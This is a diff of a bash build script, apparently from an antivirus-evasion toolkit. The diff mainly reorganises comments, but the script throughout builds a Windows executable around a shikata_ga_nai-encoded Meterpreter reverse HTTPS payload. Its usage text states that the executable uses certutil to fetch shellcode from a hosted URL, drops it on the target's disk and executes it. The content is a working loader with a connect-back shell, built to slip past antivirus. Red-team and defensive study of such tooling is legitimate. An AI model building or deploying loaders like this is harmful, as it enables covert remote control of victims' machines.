@@ -1,11 +1,10 @@
 #!/bin/bash          
-# Apply shikata, download your payload via certutil.
 
-# The generated msf payload needs to be hosted on a HTTP server
-# Call your payload like:
-# output.exe http://myserver/thepayload.bin
-# The executable will download and drop the payload as a file on the target's disk.
-# It will then execute the shellcode given in the file.
+
+#DESCRIPTION_START
+# Apply shikata, download your payload via certutil.
+#DESCRIPTION_END
+
 
 # print AVET logo
 cat banner.txt
@@ -21,9 +20,15 @@ cat banner.txt
 # import global default lhost and lport values from build/global_connect_config.sh
 . build/global_connect_config.sh
 
+
+#CONFIGURATION_START
 # override connect-back settings here, if necessary
 LPORT=$GLOBAL_LPORT
 LHOST=$GLOBAL_LHOST
+# enable debug output
+enable_debug_print
+#CONFIGURATION_END
+
 
 # make meterpreter reverse payload, encoded with shikata_ga_nai
 # additionaly to the avet encoder, further encoding should be used
@@ -46,9 +51,6 @@ set_payload_info_source no_data
 # set shellcode binding technique
 set_payload_execution_method exec_shellcode
 
-# enable debug output
-enable_debug_print
-
 # compile to exe file
 $win32_compiler -o output/downloadcertutil_revhttps_win32.exe source/avet.c
 strip output/downloadcertutil_revhttps_win32.exe
@@ -61,3 +63,12 @@ Call your payload like:
 downloadcertutil_revhttps_win32.exe http://myserver/thepayload.bin
 The executable will download and drop the payload as a file 'thepayload.bin' on the target's disk.
 It will then execute the shellcode given in the file."
+
+
+#USAGE_START
+# The generated msf payload needs to be hosted on a HTTP server
+# Call your payload like:
+# downloadcertutil_revhttps_win32.exe http://myserver/thepayload.bin
+# The executable will download and drop the payload as a file on the target's disk.
+# It will then execute the shellcode given in the file.
+#USAGE_END
